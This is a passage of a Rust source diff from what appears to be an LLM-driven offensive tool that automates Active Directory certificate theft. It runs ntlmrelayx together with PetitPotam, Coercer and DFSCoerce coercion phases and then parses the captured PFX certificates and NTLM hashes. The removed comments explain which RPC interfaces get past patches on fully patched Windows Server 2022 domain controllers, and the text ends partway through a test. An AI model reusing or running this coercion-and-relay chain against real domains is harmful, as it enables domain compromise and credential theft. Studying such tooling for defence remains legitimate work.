 /// 250ms via a connect probe to `127.0.0.1:<port>`; a connection refused
@@ -1191,12 +601,6 @@ impl CoerceProcs for RealCoerceProcs {
             cmd.arg(a);
         }
         cmd.current_dir(cwd).stdin(Stdio::null());
-        // Match `CommandBuilder` semantics: on tokio's `timeout` firing the
-        // inner `output()` future is dropped, which drops the `Child` — without
-        // `kill_on_drop` that's a no-op and we leak the child. Matters most for
-        // long-running coercion bins (PetitPotam, Coercer) and the relay tool
-        // wrappers that route here.
-        cmd.kill_on_drop(true);
         let timeout = Duration::from_secs(timeout_secs);
         match tokio::time::timeout(timeout, cmd.output()).await {
             Ok(Ok(out)) => append_output(coerce_log, header, &out).await,
@@ -1277,68 +681,26 @@ fn try_acquire_relay_lock() -> Option<TcpListener> {
     TcpListener::bind(addr).ok()
 }
 
-/// Acquire the host-wide relay-lock sentinel, waiting up to `timeout` for
-/// the in-flight holder to release. Polls every 500ms. Returns
-/// `Some(listener)` when bound, `None` when `timeout` elapses while still
-/// contended.
-///
-/// Replaces the old fail-fast bind-and-bail pattern that, under concurrent
-/// `relay_and_coerce` dispatches, caused every loser to surface
-/// `RELAY_BIND_BUSY` immediately. The orchestrator dedup-clear-retry path
-/// at `adcs_exploitation.rs::dispatch_relay_coerce_chain` would then refire
-/// next tick — fine in theory, but in practice the next tick fired multiple
-/// chains again and they all raced again, producing the storm of
-/// "another relay holds port 445; aborting candidate walk" warnings while
-/// the LLM agents simultaneously raised "I cannot start the listener"
-/// assistance loops. Queuing here serialises naturally: the winner runs
-/// its phase walk (~60–90s), drops the listener, the next caller wakes up
-/// and takes the slot.
-async fn acquire_relay_lock(timeout: Duration) -> Option<TcpListener> {
-    let deadline = Instant::now() + timeout;
-    loop {
-        if let Some(listener) = try_acquire_relay_lock() {
-            return Some(listener);
-        }
-        if Instant::now() >= deadline {
-            return None;
-        }
-        sleep(Duration::from_millis(500)).await;
-    }
-}
-
 async fn run_relay_and_coerce<P: CoerceProcs>(
-    mut cfg: RelayCoerceConfig,
+    cfg: RelayCoerceConfig,
     procs: &P,
     opts: RunOptions,
 ) -> Result<ToolOutput> {
-    // attacker_ip MUST be one of our local interface IPs. The orchestrator
-    // computes `listener_ip` from its OWN pod's egress (config.rs::detect_local_ip)
-    // and stamps it into every coercion payload — when coercion workers run in
-    // separate pods with different IPs, that value is wrong by construction.
-    // Rather than fail, derive the worker's own egress IP and substitute.
-    // We bail only when the worker truly has no usable IP.
+    // attacker_ip MUST be one of our local interface IPs. The LLM has been
+    // observed to misread context and pass a *target* host (e.g. DC01)
+    // as the attacker IP, which makes the relay listener bind to 0.0.0.0 but
+    // PetitPotam tells the coerced DC to authenticate back to the wrong host
+    // — auth never reaches the relay. Fail fast with a clear error.
     if !procs.is_local_ip(&cfg.attacker_ip) {
-        let locals = procs.list_local_ips();
-        match locals.first() {
-            Some(local) => {
-                warn!(
-                    supplied = %cfg.attacker_ip,
-                    substituted = %local,
-                    "relay_and_coerce: supplied attacker_ip is not local; substituting \
-                     this worker's own egress IP. Set ARES_LISTENER_IP per coercion pod \
-                     to silence this."
-                );
-                cfg.attacker_ip = local.clone();
-            }
-            None => {
-                anyhow::bail!(
-                    "relay_and_coerce: attacker_ip ({}) is not a local interface IP \
-                     and no local non-loopback IP is available on this worker. \
-                     Set ARES_LISTENER_IP to the worker pod's reachable IP.",
-                    cfg.attacker_ip,
-                );
-            }
-        }
+        anyhow::bail!(
+            "relay_and_coerce: attacker_ip ({}) is not a local interface IP. \
+             Pass the listener_ip / attacker_ip exactly as supplied by the \
+             orchestrator payload — this MUST be the attacker host's IP \
+             (where the relay listener binds), NOT a target machine. \
+             Available local IPs: {}",
+            cfg.attacker_ip,
+            procs.list_local_ips().join(", "),
+        );
     }
 
     // Acquire the host-wide relay lock BEFORE any teardown of stale listeners.
@@ -1352,16 +714,15 @@ async fn run_relay_and_coerce<P: CoerceProcs>(
     // The listener is held in `_relay_lock` so the kernel keeps the port bound
     // for the whole function body. Drop on return automatically releases it.
     let _relay_lock = if opts.acquire_host_lock {
-        match acquire_relay_lock(opts.relay_lock_wait).await {
+        match try_acquire_relay_lock() {
             Some(l) => Some(l),
             None => {
                 return Ok(ToolOutput {
                     stdout: format!(
                         "RELAY_BIND_BUSY\nAnother relay_and_coerce is active on this \
-                         host (loopback port {RELAY_LOCK_PORT} held) and did not release \
-                         within {wait_secs}s. Refusing to race for ntlmrelayx port 445; \
-                         retry after the in-flight relay completes.",
-                        wait_secs = opts.relay_lock_wait.as_secs(),
+                         host (loopback port {RELAY_LOCK_PORT} held). Refusing to race \
+                         for ntlmrelayx port 445; retry after the in-flight relay \
+                         completes."
                     ),
                     stderr: String::new(),
                     exit_code: Some(0),
@@ -1438,67 +799,30 @@ async fn run_relay_and_coerce<P: CoerceProcs>(
     let mut summary = format!("RELAY_PID={}\n", relay.pid());
     let mut captured_via: Option<&'static str> = None;
 
-    // Phase 0: unauth `coercer --filter-method-name=EfsRpcOpenFileRaw`.
-    // Mirrors the operator's verified-working manual command against this
-    // lab's DCs. The protocol-name filter that Phase 3 uses walks every
-    // EFSR method and the patched ones often short-circuit the call before
-    // reaching the unpatched OpenFileRaw — surfacing as NO_AUTH_RECEIVED in
-    // the coerce log while ntlmrelayx times out with nothing relayed. The
-    // single-method filter sidesteps that and hits the path PetitPotam-
-    // style abuse actually uses.
-    summary.push_str("=== unauth coercer EfsRpcOpenFileRaw ===\n");
-    let p0_args: [&str; 9] = [
-        "coerce",
-        "-t",
-        cfg.coerce_target.as_str(),
-        "-l",
-        cfg.attacker_ip.as_str(),
-        "--filter-method-name",
-        "EfsRpcOpenFileRaw",
-        "--always-continue",
-        "--auth-type=smb",
-    ];
+    // Distros differ: Kali ships `petitpotam` (symlink), pip ships
+    // `impacket-petitpotam`. Try in order, log if both missing.
+    summary.push_str("=== unauth PetitPotam ===\n");
+    let petit_bin = ["petitpotam", "impacket-petitpotam"]
+        .into_iter()
+        .find(|b| procs.which_binary(b))
+        .unwrap_or("petitpotam");
+    // PetitPotam positional args are `target path` (where `target` is the
+    // machine being coerced and `path` is the UNC the target authenticates
+    // back to). Reversing them coerces the attacker host onto itself.
+    let unc_path = format!("\\\\{}\\share\\x", cfg.attacker_ip);
+    let p1_args: [&str; 2] = [cfg.coerce_target.as_str(), unc_path.as_str()];
     procs
         .run_phase(
             &coerce_log,
-            "unauth coercer EfsRpcOpenFileRaw",
-            "coercer",
-            &p0_args,
+            "unauth PetitPotam",
+            petit_bin,
+            &p1_args,
             &workdir,
-            COERCE_PHASE_TIMEOUT_SECS,
+            25,
         )
         .await;
-    if poll_for_cert(&relay_log, opts.poll_phase_0, opts.poll_interval).await {
-        captured_via = Some("unauth_coercer_EfsRpcOpenFileRaw");
-    }
-
-    // Phase 1: classic unauth PetitPotam — different code path from coercer.
-    // Distros differ: Kali ships `petitpotam` (symlink), pip ships
-    // `impacket-petitpotam`. Try in order, log if both missing.
-    if captured_via.is_none() {
-        summary.push_str("=== unauth PetitPotam ===\n");
-        let petit_bin = ["petitpotam", "impacket-petitpotam"]
-            .into_iter()
-            .find(|b| procs.which_binary(b))
-            .unwrap_or("petitpotam");
-        // PetitPotam positional args are `target path` (where `target` is the
-        // machine being coerced and `path` is the UNC the target authenticates
-        // back to). Reversing them coerces the attacker host onto itself.
-        let unc_path = format!("\\\\{}\\share\\x", cfg.attacker_ip);
-        let p1_args: [&str; 2] = [cfg.coerce_target.as_str(), unc_path.as_str()];
-        procs
-            .run_phase(
-                &coerce_log,
-                "unauth PetitPotam",
-                petit_bin,
-                &p1_args,
-                &workdir,
-                COERCE_PHASE_TIMEOUT_SECS,
-            )
-            .await;
-        if poll_for_cert(&relay_log, opts.poll_phase_1, opts.poll_interval).await {
-            captured_via = Some("unauth_petitpotam");
-        }
+    if poll_for_cert(&relay_log, opts.poll_phase_1, opts.poll_interval).await {
+        captured_via = Some("unauth_petitpotam");
     }
 
     if captured_via.is_none() && cfg.coerce_user.is_some() {
@@ -1512,14 +836,7 @@ async fn run_relay_and_coerce<P: CoerceProcs>(
         a.push(cfg.attacker_ip.as_str());
         a.push(cfg.coerce_target.as_str());
         procs
-            .run_phase(
-                &coerce_log,
-                "DFSCoerce",
-                "dfscoerce",
-                &a,
-                &workdir,
-                COERCE_PHASE_TIMEOUT_SECS,
-            )
+            .run_phase(&coerce_log, "DFSCoerce", "dfscoerce", &a, &workdir, 25)
             .await;
         if poll_for_cert(&relay_log, opts.poll_phase_2, opts.poll_interval).await {
             captured_via = Some("MS-DFSNM");
@@ -1529,44 +846,8 @@ async fn run_relay_and_coerce<P: CoerceProcs>(
     if captured_via.is_none() && cfg.coerce_user.is_some() {
         let user = cfg.coerce_user.as_deref().unwrap();
         let secret_args = coerce_secret_args(cfg.coerce_secret.as_ref());
-        // Protocol/auth-type matrix, ordered by reliability on modern (Win2022
-        // build 20348+, fully patched) DCs against which the previous
-        // [MS-EFSR-smb, MS-RPRN-smb] pair returned NO_AUTH_RECEIVED across
-        // every method:
-        //
-        //   MS-FSRVP (ShadowCoerce) - opcode IsPathSupported. KB5005413 left
-        //                             this RPC interface unhardened; produces
-        //                             auth back to the listener on Win2022.
-        //   MS-EVEN (ElfrOpenBELW)  - EventLog Remote Protocol backup-file
-        //                             open. The UNC argument triggers auth
-        //                             before any actual log access, so even
-        //                             a least-privileged caller fires the
-        //                             callback. Often slips past hardenings
-        //                             aimed at EFSR/RPRN/DFSCoerce because
-        //                             it's a different RPC surface entirely.
-        //   MS-EFSR + http auth     - re-tries EFSRPC via the WebClient
-        //                             (WebDAV) path. UNC Hardened Access
-        //                             defaults block IP-literal SMB UNCs but
-        //                             not HTTP UNCs; on any target with
-        //                             WebClient enabled (workstations, some
-        //                             SRVs) this clears NO_AUTH_RECEIVED.
-        //                             ntlmrelayx already listens on :80.
-        //   MS-EFSR + smb           - kept for legacy / unpatched targets
-        //                             (still the highest-yield single shot).
-        //   MS-RPRN + smb           - last resort; KB5005413 silently neutered
-        //                             RpcRemoteFindFirstPrinterChangeNotification*
-        //                             on patched DCs but unpatched member
-        //                             servers may still leak.
-        for (proto, auth_type) in [
-            ("MS-FSRVP", "smb"),
-            ("MS-EVEN", "smb"),
-            ("MS-EFSR", "http"),
-            ("MS-EFSR", "smb"),
-            ("MS-RPRN", "smb"),
-        ] {
-            summary.push_str(&format!(
-                "=== authenticated coerce via {proto} ({auth_type}) ===\n"
-            ));
+        for proto in ["MS-EFSR", "MS-RPRN"] {
+            summary.push_str(&format!("=== authenticated coerce via {proto} ===\n"));
             let mut a: Vec<&str> = vec![
                 "coerce",
                 "-u",
@@ -1580,7 +861,7 @@ async fn run_relay_and_coerce<P: CoerceProcs>(
                 "--filter-protocol-name",
                 proto,
                 "--auth-type",
-                auth_type,
+                "smb",
                 "--always-continue",
             ];
             for s in &secret_args {
@@ -1589,11 +870,11 @@ async fn run_relay_and_coerce<P: CoerceProcs>(
             procs
                 .run_phase(
                     &coerce_log,
-                    &format!("coerce via {proto} ({auth_type})"),
+                    &format!("coerce via {proto}"),
                     "coercer",
                     &a,
                     &workdir,
-                    COERCE_PHASE_TIMEOUT_SECS,
+                    25,
                 )
                 .await;
             if poll_for_cert(&relay_log, opts.poll_phase_3, opts.poll_interval).await {
@@ -1679,7 +960,7 @@ async fn run_relay_and_coerce<P: CoerceProcs>(
     Ok(ToolOutput {
         stdout,
         stderr: String::new(),
-        exit_code: Some(i32::from(!success)),
+        exit_code: Some(if success { 0 } else { 1 }),
         success,
     })
 }
@@ -1755,55 +1036,50 @@ struct PfxCapture {
     pfx_basename: String,
 }
 
-/// Walk the relay log and pair each `Writing PKCS#12 certificate to <path>`
-/// line with the auth line that produced it — the most-recent
-/// authenticating-as-user line *before* the PFX write, not the most-recent
-/// overall. Returns the LAST such (user, pfx) pair seen so a long phase walk
-/// with multiple captures still surfaces the freshest one.
-///
-/// The earlier "last_user × last_pfx" form (most-recent-of-each) misfires
-/// when the relay catches incidental auth from a different machine *after*
-/// the PFX has already been written — e.g. an ntlmrelayx with
-/// `--keep-relaying` accepts a stray DC02$ probe *after* writing
-/// DC01.pfx, and the final `(DC02$, ./DC01.pfx)` pair fed to
-/// `certipy_auth` PKINIT-fails with KDC_ERR_C_PRINCIPAL_UNKNOWN. Pairing
-/// by line proximity (last user *before* the PKCS#12 write) keeps the
-/// principal aligned with the cert subject.
+/// Walk the relay log, pair the most-recent authenticating-as-user line with
+/// the most-recent "Writing PKCS#12 certificate to <path>" line. Returns None
+/// if either marker is missing.
 fn extract_pfx_capture_from_log(log: &str) -> Option<PfxCapture> {
-    let mut current_user: Option<String> = None;
-    let mut paired: Option<PfxCapture> = None;
+    let mut last_user: Option<String> = None;
+    let mut last_pfx: Option<String> = None;
 
     for line in log.lines() {
         // "[*] Authenticating against http://... as DOMAIN/USER$ SUCCEED"
         // "[*] SMBD-Thread-N: Connection from DOMAIN/USER$@ip controlled, attacking..."
         // Both shapes appear depending on flow; pull the user after the slash.
         if let Some(user) = parse_relayed_user(line) {
-            current_user = Some(user);
+            last_user = Some(user);
         }
         // "[*] Writing PKCS#12 certificate to ./DC01.pfx"
         if let Some(idx) = line.find("Writing PKCS#12 certificate to ") {
             let after = &line[idx + "Writing PKCS#12 certificate to ".len()..];
             let path = after.split_whitespace().next().unwrap_or("");
             if !path.is_empty() {
-                let user = current_user.clone().unwrap_or_else(|| {
-                    // Fallback when no auth line preceded the write — derive
-                    // the principal from the PFX basename (ntlmrelayx names
-                    // the file after the relayed account).
-                    std::path::Path::new(path.trim_start_matches("./"))
-                        .file_stem()
-                        .and_then(|s| s.to_str())
-                        .unwrap_or("relayed")
-                        .to_string()
-                });
-                paired = Some(PfxCapture {
-                    user,
-                    pfx_basename: path.to_string(),
-                });
+                last_pfx = Some(path.to_string());
             }
         }
     }
 
-    paired
+    match (last_user, last_pfx) {
+        (Some(u), Some(p)) => Some(PfxCapture {
+            user: u,
+            pfx_basename: p,
+        }),
+        // If we got a PFX path but no user, fall back to the file's basename
+        // (ntlmrelayx names the PFX after the user).
+        (None, Some(p)) => {
+            let base = std::path::Path::new(p.trim_start_matches("./"))
+                .file_stem()
+                .and_then(|s| s.to_str())
+                .unwrap_or("relayed")
+                .to_string();
+            Some(PfxCapture {
+                user: base,
+                pfx_basename: p,
+            })
+        }
+        _ => None,
+    }
 }
 
 /// Pull a relayed username out of a line that looks like
@@ -1926,6 +1202,13 @@ mod tests {
     }
 
     #[tokio::test]
+    async fn start_responder_force_ntlmv1() {
+        mock::push(mock::success());
+        let args = json!({"interface": "eth1", "force_ntlmv1": true});
+        assert!(start_responder(&args).await.is_ok());
+    }
+
+    #[tokio::test]
     async fn start_mitm6_executes() {
         mock::push(mock::success());
         let args = json!({"domain": "contoso.local"});
@@ -2042,14 +1325,8 @@ mod tests {
         assert!(err.contains("forbidden"));
     }
 
-    #[test]
-    fn parse_relay_coerce_args_accepts_same_host_for_smb_to_http() {
-        // Self-coerce (ca_host == coerce_target) is intentionally permitted
-        // now. ESC8/ESC11 default to SMB→HTTP / SMB→RPC relay and MS16-075's
-        // same-machine NTLM loopback rejection only fires when the inbound
-        // and outbound auth protocols match on the same host. SMB→HTTP does
-        // not trip the check and same-host coerce-relay reliably yields a
-        // PFX in single-DC topologies where no foreign coerce target exists.
+    #[tokio::test]
+    async fn relay_and_coerce_rejects_same_host() {
         let args = json!({
             "ca_host": "192.168.58.10",
             "coerce_target": "192.168.58.10",
@@ -2058,8 +1335,8 @@ mod tests {
             "coerce_hash": "b8d76e56e9dac90539aff05e3ccb1755",
             "coerce_domain": "contoso.local"
         });
-        let cfg = super::parse_relay_coerce_args(&args).expect("self-coerce must parse");
-        assert_eq!(cfg.ca_host, cfg.coerce_target);
+        let err = relay_and_coerce(&args).await.unwrap_err().to_string();
+        assert!(err.contains("must differ") || err.contains("loopback"));
     }
 
     #[test]
@@ -2205,7 +1482,7 @@ mod tests {
             Self {
                 state: Mutex::new(FakeState {
                     is_local_ip: true,
-                    local_ips: vec!["192.168.58.5".into()],
+                    local_ips: vec!["192.168.58.1".into()],
                     binaries_present: ["petitpotam".to_string()].into_iter().collect(),
                     relay_early_exit: None,
                     relay_initial_log: Vec::new(),
@@ -2219,11 +1496,6 @@ mod tests {
 
         fn with_local_ip(self, allowed: bool) -> Self {
             self.state.lock().unwrap().is_local_ip = allowed;
-            self
-        }
-
-        fn with_local_ips(self, ips: Vec<String>) -> Self {
-            self.state.lock().unwrap().local_ips = ips;
             self
         }
 
@@ -2385,19 +1657,10 @@ mod tests {
         }
     }
 
-    /// Tests that bind the real `RELAY_LOCK_PORT` (41445) must serialize:
-    /// only one process can hold the port at a time, and cargo test runs
-    /// tests in parallel by default. Acquire this before binding the
-    /// sentinel for the test. Async Mutex so the guard can be held across
-    /// the tokio `.await` points the sentinel tests have (clippy flags a
-    /// `std::sync::Mutex` guard held across await as a deadlock risk).
-    static SENTINEL_TEST_LOCK: tokio::sync::Mutex<()> = tokio::sync::Mutex::const_new(());
-
     fn fast_opts() -> super::RunOptions {
         super::RunOptions {
             relay_settle: Duration::from_millis(0),
             poll_interval: Duration::from_millis(2),
-            poll_phase_0: Duration::from_millis(15),
             poll_phase_1: Duration::from_millis(15),
             poll_phase_2: Duration::from_millis(15),
             poll_phase_3: Duration::from_millis(15),
@@ -2411,10 +1674,6 @@ mod tests {
             // CoerceProcs doesn't actually bind anywhere, and a non-zero
             // wait_for_port_free probe would still slow the suite.
             bind_check: Duration::from_millis(0),
-            // Fail-fast lock-acquire in tests. The wait-acquire path is
-            // covered by dedicated tests that pass a non-zero value via
-            // RunOptions overrides.
-            relay_lock_wait: Duration::from_millis(0),
         }
     }
 
@@ -2446,58 +1705,25 @@ mod tests {
         }
     }
 
-    const PHASE0: &str = "unauth coercer EfsRpcOpenFileRaw";
     const PHASE1: &str = "unauth PetitPotam";
     const PHASE2: &str = "DFSCoerce";
-    const PHASE3_FSRVP: &str = "coerce via MS-FSRVP (smb)";
-    const PHASE3_EVEN: &str = "coerce via MS-EVEN (smb)";
-    const PHASE3_EFSR_HTTP: &str = "coerce via MS-EFSR (http)";
-    const PHASE3_EFSR: &str = "coerce via MS-EFSR (smb)";
-    const PHASE3_RPRN: &str = "coerce via MS-RPRN (smb)";
+    const PHASE3_EFSR: &str = "coerce via MS-EFSR";
+    const PHASE3_RPRN: &str = "coerce via MS-RPRN";
 
     #[tokio::test]
-    async fn run_attacker_ip_not_local_substitutes_when_locals_available() {
-        // Substitution path: orchestrator passes the wrong attacker_ip (e.g.
-        // its own egress instead of the coercion worker's). The worker has at
-        // least one usable local IP, so we substitute and proceed rather than
-        // bailing. This was the original op-stalling bug — every coercion
-        // task was rejected because the supplied IP didn't match the worker.
-        let fake = FakeCoerceProcs::new()
-            .with_local_ip(false)
-            .with_local_ips(vec!["192.168.58.99".into()]);
-        let out = super::run_relay_and_coerce(cfg_unauth(), &fake, fast_opts())
-            .await
-            .expect("substitute and proceed");
-        // The run proceeds through the phase machinery (no creds, phase1 only
-        // for unauth path) — we don't assert success/failure of the relay
-        // itself, just that we got past the IP check.
-        assert!(
-            out.stdout.contains("RELAY_PID") || out.stdout.contains("RELAY LOG"),
-            "expected relay machinery to run after substitution; got: {}",
-            out.stdout
-        );
-    }
-
-    #[tokio::test]
-    async fn run_attacker_ip_not_local_and_no_locals_bails() {
-        // Truly stuck — worker has zero usable IPs (loopback only). Bail
-        // with an actionable error so the operator sets ARES_LISTENER_IP.
-        let fake = FakeCoerceProcs::new()
-            .with_local_ip(false)
-            .with_local_ips(Vec::new());
+    async fn run_attacker_ip_not_local_bails_with_clear_error() {
+        let fake = FakeCoerceProcs::new().with_local_ip(false);
         let err = super::run_relay_and_coerce(cfg_unauth(), &fake, fast_opts())
             .await
             .unwrap_err()
             .to_string();
         assert!(err.contains("not a local interface IP"), "got: {err}");
-        assert!(err.contains("ARES_LISTENER_IP"), "got: {err}");
     }
 
     #[tokio::test]
     async fn run_host_lock_contention_returns_busy_marker() {
         // Hold the sentinel port ourselves to simulate another in-flight
         // relay_and_coerce already running on this host.
-        let _serialize = SENTINEL_TEST_LOCK.lock().await;
         let _holder = std::net::TcpListener::bind(("127.0.0.1", super::RELAY_LOCK_PORT))
             .expect("bind sentinel port for test");
         super::USE_REAL_RELAY_LOCK_IN_TEST.with(|c| c.set(true));
@@ -2526,7 +1752,6 @@ mod tests {
 
     #[tokio::test]
     async fn ntlmrelayx_to_smb_returns_busy_when_lock_held() {
-        let _serialize = SENTINEL_TEST_LOCK.lock().await;
         let _holder = std::net::TcpListener::bind(("127.0.0.1", super::RELAY_LOCK_PORT))
             .expect("bind sentinel port for test");
         super::USE_REAL_RELAY_LOCK_IN_TEST.with(|c| c.set(true));
@@ -2578,9 +1803,7 @@ mod tests {
         assert!(out.stdout.contains("RELAYED_USER=DC01$"));
         assert!(out.stdout.contains("PFX_FILE="));
         let headers: Vec<_> = fake.calls().into_iter().map(|c| c.header).collect();
-        // Phase 0 runs first (and misses, since the fake isn't seeded for it),
-        // then Phase 1 captures and short-circuits remaining phases.
-        assert_eq!(headers, vec![PHASE0, PHASE1]);
+        assert_eq!(headers, vec![PHASE1]);
     }
 
     #[tokio::test]
@@ -2592,8 +1815,7 @@ mod tests {
         assert!(!out.success);
         assert!(!out.stdout.contains("CERT_CAPTURED_VIA"));
         let headers: Vec<_> = fake.calls().into_iter().map(|c| c.header).collect();
-        // Unauth path: Phase 0 + Phase 1 both miss; Phase 2/3 need creds.
-        assert_eq!(headers, vec![PHASE0, PHASE1]);
+        assert_eq!(headers, vec![PHASE1]);
     }
 
     #[tokio::test]
@@ -2607,7 +1829,7 @@ mod tests {
         assert!(out.success);
         assert!(out.stdout.contains("CERT_CAPTURED_VIA=MS-DFSNM"));
         let headers: Vec<_> = fake.calls().into_iter().map(|c| c.header).collect();
-        assert_eq!(headers, vec![PHASE0, PHASE1, PHASE2]);
+        assert_eq!(headers, vec![PHASE1, PHASE2]);
     }
 
     #[tokio::test]
@@ -2622,69 +1844,7 @@ mod tests {
         assert!(out.success);
         assert!(out.stdout.contains("CERT_CAPTURED_VIA=MS-RPRN"));
         let headers: Vec<_> = fake.calls().into_iter().map(|c| c.header).collect();
-        assert_eq!(
-            headers,
-            vec![
-                PHASE0,
-                PHASE1,
-                PHASE2,
-                PHASE3_FSRVP,
-                PHASE3_EVEN,
-                PHASE3_EFSR_HTTP,
-                PHASE3_EFSR,
-                PHASE3_RPRN
-            ]
-        );
-    }
-
-    #[tokio::test]
-    async fn run_phase0_capture_skips_remaining_phases() {
-        // Phase 0 is the new verified-working unauth EfsRpcOpenFileRaw
-        // path. When it captures, no further phases should run — even
-        // when creds are supplied (which would otherwise unlock 2 and 3).
-        let log = b"[*] (SMB): Authenticating CONTOSO/DC01$@192.168.58.20 SUCCEED\n\
-                    [*] GOT CERTIFICATE! ID 1\n\
-                    [*] Writing PKCS#12 certificate to ./DC01.pfx\n";
-        let fake = FakeCoerceProcs::new().with_phase_pfx_drop(PHASE0, log, "DC01.pfx", b"\xfe\xed");
-        let out = super::run_relay_and_coerce(cfg_with_creds(), &fake, fast_opts())
-            .await
-            .unwrap();
-        assert!(out.success);
-        assert!(out
-            .stdout
-            .contains("CERT_CAPTURED_VIA=unauth_coercer_EfsRpcOpenFileRaw"));
-        let headers: Vec<_> = fake.calls().into_iter().map(|c| c.header).collect();
-        assert_eq!(headers, vec![PHASE0]);
-    }
-
-    #[tokio::test]
-    async fn run_phase0_invokes_coercer_with_efsrpc_method_filter() {
-        // Inspect Phase 0's argv to make sure we're invoking the verified-
-        // working method (--filter-method-name=EfsRpcOpenFileRaw) and not
-        // the protocol-name-scoped variant that walked patched methods and
-        // produced NO_AUTH_RECEIVED in production.
-        let fake = FakeCoerceProcs::new();
-        let _ = super::run_relay_and_coerce(cfg_unauth(), &fake, fast_opts())
-            .await
-            .unwrap();
-        let calls = fake.calls();
-        let phase0 = calls
-            .iter()
-            .find(|c| c.header == PHASE0)
-            .expect("phase 0 should always run first");
-        assert_eq!(phase0.bin, "coercer");
-        let joined = phase0.args.join(" ");
-        assert!(
-            joined.contains("--filter-method-name EfsRpcOpenFileRaw"),
-            "phase 0 must use single-method filter, got: {joined}"
-        );
-        assert!(joined.contains("--always-continue"), "args: {joined}");
-        assert!(joined.contains("--auth-type=smb"), "args: {joined}");
-        // Listener IP must be the attacker IP from the config.
-        assert!(
-            joined.contains("-l 192.168.58.100"),
-            "expected listener flag with attacker IP, got: {joined}"
-        );
+        assert_eq!(headers, vec![PHASE1, PHASE2, PHASE3_EFSR, PHASE3_RPRN]);
     }
 
     #[tokio::test]
@@ -2803,42 +1963,6 @@ MIIBlahSecondCert==\n\
     }
 
     #[test]
-    fn extract_pfx_capture_pairs_user_with_pfx_by_proximity() {
-        // Regression: when `--keep-relaying` catches a stray auth AFTER the
-        // PFX has been written, the old `last_user × last_pfx` form mispaired
-        // the cert with the late auth (e.g. DC01.pfx paired with
-        // DC02$) and certipy_auth bailed with KDC_ERR_C_PRINCIPAL_UNKNOWN.
-        let log = "\
-[*] Servers started, waiting for connections\n\
-[*] (SMB): Authenticating CONTOSO/DC01$@192.168.58.11 SUCCEED\n\
-[*] GOT CERTIFICATE! ID 6\n\
-[*] Writing PKCS#12 certificate to ./DC01.pfx\n\
-[*] (SMB): Authenticating CONTOSO/DC02$@192.168.58.12 SUCCEED\n\
-[*] done\n";
-        let cap = super::extract_pfx_capture_from_log(log).expect("should extract");
-        assert_eq!(
-            cap.user, "DC01$",
-            "user must be paired with the cert that was actually written, not a later stray auth"
-        );
-        assert_eq!(cap.pfx_basename, "./DC01.pfx");
-    }
-
-    #[test]
-    fn extract_pfx_capture_returns_last_pair_when_multiple_writes() {
-        // When the relay walks several coerce phases and writes more than
-        // one PFX, the LAST pair is the one the caller wants — that's the
-        // freshest, most-recently-issued cert.
-        let log = "\
-[*] (SMB): Authenticating CONTOSO/DC01$@192.168.58.10 SUCCEED\n\
-[*] Writing PKCS#12 certificate to ./DC01.pfx\n\
-[*] (SMB): Authenticating CONTOSO/DC02$@192.168.58.11 SUCCEED\n\
-[*] Writing PKCS#12 certificate to ./DC02.pfx\n";
-        let cap = super::extract_pfx_capture_from_log(log).expect("should extract");
-        assert_eq!(cap.user, "DC02$");
-        assert_eq!(cap.pfx_basename, "./DC02.pfx");
-    }
-
-    #[test]
     fn parse_relayed_user_handles_domain_user_dollar_at_ip() {
         assert_eq!(
             super::parse_relayed_user("blah CONTOSO/DC01$@192.168.58.20 SUCCEED"),
@@ -2896,182 +2020,5 @@ MIIBlahSecondCert==\n\
         let r = super::wait_for_port_free(port, std::time::Duration::from_millis(200)).await;
         assert!(r.is_err(), "expected held port, got: {r:?}");
         // Listener is dropped at end of scope, releasing the port.
-    }
-
-    #[tokio::test]
-    async fn verify_listener_present_ok_when_bound() {
-        use tokio::net::TcpListener;
-        super::PROBE_REAL_LISTENER_IN_TEST.with(|c| c.set(true));
-        let listener = TcpListener::bind("127.0.0.1:0").await.unwrap();
-        let port = listener.local_addr().unwrap().port();
-        let r = super::verify_listener_present("127.0.0.1", port).await;
-        super::PROBE_REAL_LISTENER_IN_TEST.with(|c| c.set(false));
-        assert!(r.is_ok(), "expected listener present, got: {r:?}");
-    }
-
-    #[tokio::test]
-    async fn verify_listener_present_err_when_unbound() {
-        // Bind, capture port, drop — the port is now free. Probe should
-        // see ConnectionRefused and return Err.
-        super::PROBE_REAL_LISTENER_IN_TEST.with(|c| c.set(true));
-        let port = {
-            let listener = std::net::TcpListener::bind("127.0.0.1:0").unwrap();
-            listener.local_addr().unwrap().port()
-        };
-        let r = super::verify_listener_present("127.0.0.1", port).await;
-        super::PROBE_REAL_LISTENER_IN_TEST.with(|c| c.set(false));
-        assert!(r.is_err(), "expected no listener, got: {r:?}");
-    }
-
-    #[test]
-    fn no_relay_listener_sentinel_is_stable() {
-        // Pinned: orchestrator pattern-matches on this exact string in the
-        // tool output to route a coerce-without-listener back through
-        // relay_and_coerce. Changing the value here without updating the
-        // matcher silently regresses the fix.
-        assert_eq!(super::NO_RELAY_LISTENER_SENTINEL, "NO_RELAY_LISTENER");
-    }
-
-    #[test]
-    fn no_listener_output_includes_sentinel_and_remediation() {
-        let out = super::no_listener_output("coercer", "192.168.58.5", "nothing listening");
-        assert!(out.stdout.starts_with("NO_RELAY_LISTENER"));
-        assert!(out.stdout.contains("192.168.58.5:445"));
-        assert!(out.stdout.contains("relay_and_coerce"));
-        assert!(!out.success);
-        assert_eq!(out.exit_code, Some(0));
-    }
-
-    #[test]
-    fn extract_responder_hashes_picks_ntlmv2_ssp_line() {
-        let dump = "\
-[*] Serving HTTP\n\
-[SMB] NTLMv2-SSP Client   : 192.168.58.10\n\
-[SMB] NTLMv2-SSP Username : CONTOSO\\DC01$\n\
-[SMB] NTLMv2-SSP Hash     : DC01$::CONTOSO:aabbccdd11223344:abc123:0101000000000000\n";
-        let hashes = super::extract_responder_hashes(dump);
-        assert_eq!(hashes.len(), 1);
-        assert!(hashes[0].starts_with("DC01$::CONTOSO:"));
-    }
-
-    #[test]
-    fn extract_responder_hashes_dedupes_repeated_captures() {
-        // DC retransmits or PetitPotam re-auths can produce the same
-        // hash twice within one window — dedup so the LLM doesn't see
-        // a noisy CAPTURED_HASH_COUNT.
-        let dup = "DC01$::CONTOSO:aabbccdd:abc:0101";
-        let dump = format!(
-            "[SMB] NTLMv2-SSP Hash : {dup}\n\
-             [SMB] NTLMv2-SSP Hash : {dup}\n"
-        );
-        let hashes = super::extract_responder_hashes(&dump);
-        assert_eq!(hashes.len(), 1);
-        assert_eq!(hashes[0], dup);
-    }
-
-    #[test]
-    fn extract_responder_hashes_picks_ntlmv1_variants() {
-        let dump = "\
